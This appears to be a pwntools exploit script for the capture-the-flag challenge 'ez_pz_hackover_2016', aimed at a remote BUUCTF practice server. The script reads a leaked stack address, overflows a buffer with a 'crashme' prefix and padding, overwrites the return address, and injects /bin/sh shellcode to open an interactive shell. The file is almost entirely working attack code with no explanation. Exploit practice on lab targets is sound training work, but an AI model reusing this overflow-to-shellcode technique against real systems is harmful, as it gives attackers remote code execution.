#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'ez_pz_hackover_2016'
remote_addr, port = 'node5.buuoj.cn:25826'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda x:log.success(x)
slp = lambda x:sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

#Main function
if __name__ == '__main__':
    #you can add your code here
    shellcode = asm(shellcraft.sh())
    printf_plt = elf.plt['printf']
    printf_got = elf.got['printf']
    chall = elf.sym['chall']
    ru(': ')
    var = int(rl().strip(b'\n'),16) - 0x1c
    display(f'var-s addr--> {hex(var)}')
    payload = b'crashme\x00'
    payload = payload.ljust(0x16,b'a') + b'b'*0x4 + p32(var) + shellcode
    #dbg()
    sla('>',payload)
    p.interactive()
